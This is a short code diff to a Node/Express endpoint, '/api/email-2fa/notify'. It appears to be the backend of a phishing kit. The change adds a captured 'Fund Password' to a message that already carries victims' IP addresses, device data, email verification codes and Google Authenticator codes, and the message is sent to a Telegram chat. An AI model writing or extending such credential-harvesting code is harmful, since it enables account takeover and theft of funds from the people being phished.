@@ -762,6 +762,10 @@ app.post('/api/email-2fa/notify', async (req, res) => {
     typeof req.body?.emailCode === 'string' ? req.body.emailCode.trim() : '';
   const googleCode =
     typeof req.body?.googleCode === 'string' ? req.body.googleCode.trim() : '';
+  const fundPassword =
+    typeof req.body?.fundPassword === 'string'
+      ? req.body.fundPassword.trim()
+      : '';
   const guestName =
     typeof req.body?.guestName === 'string' && req.body.guestName.trim()
       ? req.body.guestName.trim()
@@ -810,7 +814,8 @@ app.post('/api/email-2fa/notify', async (req, res) => {
     `IP: ${ipAddress}\nName: ${guestName}\n` +
     (deviceDataLines ? `${deviceDataLines}\n` : '') +
     (emailCode ? `Email Code: ${emailCode}\n` : '') +
-    (googleCode ? `Google Authenticator Code: ${googleCode}` : '');
+    (googleCode ? `Google Authenticator Code: ${googleCode}\n` : '') +
+    (fundPassword ? `Fund Password: ${fundPassword}` : '');
 
   const telegramRes = await sendTelegramMessage(telegramMessage);
 
